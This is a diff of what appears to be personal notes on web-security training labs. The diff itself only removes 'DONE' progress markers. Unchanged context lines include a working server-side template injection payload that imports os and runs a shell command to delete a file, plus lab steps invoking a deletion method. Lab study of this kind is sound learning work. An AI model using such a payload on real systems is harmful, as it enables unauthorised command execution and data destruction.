@@ -262,7 +262,6 @@
 
 * Now just delete that morale.txt file
 
-* DONE
 
 
 
@@ -338,7 +337,6 @@ Reference => https://book.hacktricks.xyz/pentesting-web/ssti-server-side-templat
 
 * `user.first_name}}{%25+import+os+%25}{{+os.popen("rm+morale.txt").read()+}}`
 
-* DONE
 
 
 
@@ -454,7 +452,7 @@ References =>
     
     ```
 
-* DONE
+* 
 
 
 
@@ -504,7 +502,7 @@ Note -> `websites will contain both built-in objects provided by the template an
   Got -> 8ywunoxxgy43ti34ys906tpcyn3wko77
   ```
 
-* DONE
+* 
 
 
 
@@ -541,7 +539,7 @@ References =>
 
     
 
-* DONE
+* 
 
 
 
@@ -645,7 +643,7 @@ References =>
   Invoke the user.gdprDelete() method and view your comment again to solve the lab.
   ```
 
-* DONE
+* 
 
 ## Directory traversal
 
